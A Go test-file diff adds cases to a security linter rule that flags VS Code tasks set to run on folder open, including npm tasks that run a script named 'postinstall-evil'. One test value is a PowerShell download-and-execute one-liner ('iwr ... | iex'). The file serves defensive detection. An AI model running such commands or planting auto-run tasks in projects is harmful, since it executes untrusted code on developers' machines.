@@ -131,6 +131,8 @@ func TestCFG047_ShellOnlyAndDenoWatch1672(t *testing.T) {
 		{"shell then payload on windows", parser.VSCodeTask{Label: "w", Command: "${env:SHELL}", Windows: &parser.VSCodeTaskOverride{Command: "powershell -c iwr https://example.com | iex"}, RunOptions: folderOpen}, finding.Error, ""},
 		{"shell and dependsOn", parser.VSCodeTask{Label: "s", Command: "bash", DependsOn: json.RawMessage(`["Nope"]`), RunOptions: folderOpen}, finding.Error, ""},
 		{"deno task without --watch", parser.VSCodeTask{Label: "d", Command: "deno task schema", RunOptions: folderOpen}, finding.Error, ""},
+		{"npm script with per-OS override", npmOverrideTask(t), finding.Error, ""},
+		{"npm script with shell command", parser.VSCodeTask{Label: "n", Type: "npm", Script: "postinstall-evil", Command: "bash", RunOptions: folderOpen}, finding.Error, ""},
 	} {
 		f := CFG047.Check(tasksTarget(tc.task))
 		if len(f) != 1 || f[0].Severity != tc.want || !strings.Contains(f[0].Message, tc.note) {
@@ -150,4 +152,20 @@ func TestVSCodeTaskOptionsParsed1672(t *testing.T) {
 	if string(task.Options) != `{"env":{"BASH_ENV":"./x"}}` || task.Linux == nil || string(task.Linux.Options) != `{"cwd":"/"}` {
 		t.Errorf("options not kept: %s / %+v", task.Options, task.Linux)
 	}
+}
+
+// npmOverrideTask is an npm task whose only per-OS override sets neither
+// command nor args, so CommandLines() is empty; it runs a repository script
+// and must not count as shell-only (#1672 review).
+func npmOverrideTask(t *testing.T) parser.VSCodeTask {
+	t.Helper()
+	var tasks parser.VSCodeTasks
+	data := `{"tasks":[{"label": "x", "type": "npm", "script": "postinstall-evil", "linux": {"problemMatcher": []}, "runOptions": {"runOn": "folderOpen"}}]}`
+	if err := json.Unmarshal([]byte(data), &tasks); err != nil {
+		t.Fatal(err)
+	}
+	if got := tasks.Tasks[0].CommandLines(); len(got) != 0 {
+		t.Fatalf("want no command lines, got %q", got)
+	}
+	return tasks.Tasks[0]
 }
